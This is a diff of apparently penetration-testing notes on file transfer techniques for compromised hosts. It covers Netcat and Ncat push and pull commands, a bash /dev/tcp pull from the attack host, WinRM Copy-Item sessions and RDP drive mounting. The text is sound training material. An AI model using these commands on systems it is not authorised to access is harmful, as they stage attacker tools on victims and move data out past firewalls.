@@ -1,147 +1,76 @@
-## Netcat Inbound Transfer
+# Miscellaneous File Transfer Methods
 
-Firewall allows inbound connections to the target and a Netcat-variant is present on the victim.
+## Netcat / Ncat
 
-Listen on victim using original Netcat to receive file
+Two directions — pick based on whether inbound to the target is blocked.
 
-```
-nc -l -p <PORT> > <FILE_PATH>
-```
+Target listens, attack host pushes (inbound to target must be open):
 
-Listen on victim using Ncat to receive file and close on completion
-
-```
-ncat -l -p <PORT> --recv-only > <FILE_PATH>
+```bash
+# target
+nc -l -p 8000 > <OUTFILE>
+ncat -l -p 8000 --recv-only > <OUTFILE>
 ```
 
-Send file from attack host to listening victim using original Netcat
-
-```
-nc -q 0 <TARGET_IP> <PORT> < <FILE_PATH>
-```
-
-Send file from attack host to listening victim using Ncat
-
-```
-ncat --send-only <TARGET_IP> <PORT> < <FILE_PATH>
+```bash
+# attack host
+nc -q 0 <TARGET_IP> 8000 < <FILE>
+ncat --send-only <TARGET_IP> 8000 < <FILE>
 ```
 
-- **Tool comparison**
-    
-    - Original Netcat -> `nc -l -p <PORT>` -> Basic listener; lacks modern proxy/SSL support.
-    - Ncat -> `ncat -l -p <PORT> --recv-only` -> Reimplementation; supports SSL, IPv6, SOCKS, and explicit connection termination.
-- **Gotchas**
-    
-    - **Connection hangs** if `-q 0` (original nc) or `--send-only`/`--recv-only` (ncat) flags are omitted.
+Attack host listens, target pulls (use when inbound to target is blocked):
 
-## Netcat Outbound Transfer
-
-Inbound connections to the target are blocked by a firewall but egress to the attack host is permitted.
-
-Listen on attack host to send file using original Netcat
-
-```
-sudo nc -l -p <PORT> -q 0 < <FILE_PATH>
+```bash
+# attack host
+sudo nc -l -p 443 -q 0 < <FILE>
+sudo ncat -l -p 443 --send-only < <FILE>
 ```
 
-Listen on attack host to send file using Ncat
-
-```
-sudo ncat -l -p <PORT> --send-only < <FILE_PATH>
-```
-
-Connect from victim to receive file using original Netcat
-
-```
-nc <ATTACK_IP> <PORT> > <FILE_PATH>
+```bash
+# target
+nc <LHOST> 443 > <OUTFILE>
+ncat <LHOST> 443 --recv-only > <OUTFILE>
 ```
 
-Connect from victim to receive file using Ncat
+No nc/ncat on target — `/dev/tcp` bash fallback (attack host still listens as above):
 
-```
-ncat <ATTACK_IP> <PORT> --recv-only > <FILE_PATH>
-```
-
-- **Dangerous / misconfigured settings**
-    - Listening on low-numbered ports requires **root/sudo privileges** on the attack host.
-
-## Bash /dev/tcp Transfer
-
-Netcat/Ncat is missing from the victim but Bash is available for outbound connections to the attack host.
-
-Receive file on victim via pseudo-device
-
-```
-cat < /dev/tcp/<ATTACK_IP>/<PORT> > <FILE_PATH>
+```bash
+cat < /dev/tcp/<LHOST>/443 > <OUTFILE>
 ```
 
-- **Gotchas**
-    - **Silent failure** occurs if the Bash version was not compiled with the net-redirections feature enabled.
+> [!tip] `-q 0` / `--send-only` and `--recv-only` are what actually close the connection cleanly after transfer. Without them both sides hang waiting for more data.
 
-> ⚠️ Gap: The source does not specify how to verify if `/dev/tcp` support is enabled in the current Bash build before attempting the transfer.
+---
 
-## PowerShell Remoting Transfer
+## PowerShell Remoting (WinRM)
 
-HTTP/SMB transfer methods are blocked but WinRM is enabled and administrative credentials or proper group membership are available.
+Use when HTTP/HTTPS/SMB are all blocked — WinRM on TCP/5985 (HTTP) or 5986 (HTTPS) may still be open between Windows hosts.
 
-Verify WinRM connectivity to target
+Confirm WinRM reachable before attempting:
 
-```
-Test-NetConnection -ComputerName <TARGET_IP> -Port 5985
-```
-
-Establish session to target using existing privileges
-
-```
-$Session = New-PSSession -ComputerName <TARGET_IP>
+```powershell
+Test-NetConnection -ComputerName <HOSTNAME> -Port 5985
 ```
 
-Copy file from attack host to remote session
+Create session, then push/pull with Copy-Item:
 
-```
-Copy-Item -Path <FILE_PATH> -ToSession $Session -Destination <FILE_PATH>
-```
-
-Copy file from remote session back to attack host
-
-```
-Copy-Item -Path <FILE_PATH> -Destination <FILE_PATH> -FromSession $Session
+```powershell
+$Session = New-PSSession -ComputerName <HOSTNAME>
+Copy-Item -Path <LOCALFILE> -ToSession $Session -Destination <REMOTE_PATH>
+Copy-Item -Path <REMOTE_PATH> -Destination <LOCALPATH> -FromSession $Session
 ```
 
-- **Dangerous / misconfigured settings**
-    
-    - Requires **Administrative access**, Remote Management Users group membership, or explicit session configuration permissions.
-- **Gotchas**
-    
-    - **WinRM disabled** by default unless listeners are configured; typically uses 5985 (HTTP) or 5986 (HTTPS).
+---
 
-## RDP Resource Mounting
+## RDP
 
-GUI access is available via RDP and large file transfers or directory access are required without using the clipboard.
+Mount a local folder into the RDP session at connect time:
 
-Mount Linux directory using rdesktop
-
-```
-rdesktop <TARGET_IP> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' -r disk:linux='<FILE_PATH>'
+```bash
+xfreerdp /v:<TARGET> /d:<DOMAIN> /u:<USER> /p:<PASS> /drive:linux,<LOCAL_PATH>
+rdesktop <TARGET> -d <DOMAIN> -u <USER> -p <PASS> -r disk:linux=<LOCAL_PATH>
 ```
 
-Mount Linux directory using xfreerdp
+Mounted share is accessible inside the session at `\\tsclient\<SHARENAME>`. Drag/drop or `copy` from there directly.
 
-```
-xfreerdp /v:<TARGET_IP> /d:<DOMAIN> /u:<USERNAME> /p:'<PASSWORD>' /drive:linux,<FILE_PATH>
-```
-
-Access mounted share within Windows session
-
-```
-cd \\tsclient\linux
-```
-
-- **Tool comparison**
-    
-    - xfreerdp/rdesktop -> `/drive` or `-r disk` -> Use when copy/paste fails or transferring multiple files.
-    - mstsc.exe -> Local Resources tab -> Native Windows client for mounting local drives.
-- **Gotchas**
-    
-    - **Malware deletion** by Windows Defender occurs automatically if it scans the mounted share containing flagged tools.
-    - **Clipboard failure** is common with xfreerdp and rdesktop, necessitating the drive mounting method.
+> [!warning] Mounting a folder containing tools/malware through RDP may trigger Defender on the remote host and delete files from your local folder too — Defender reaches back through the mapped drive.
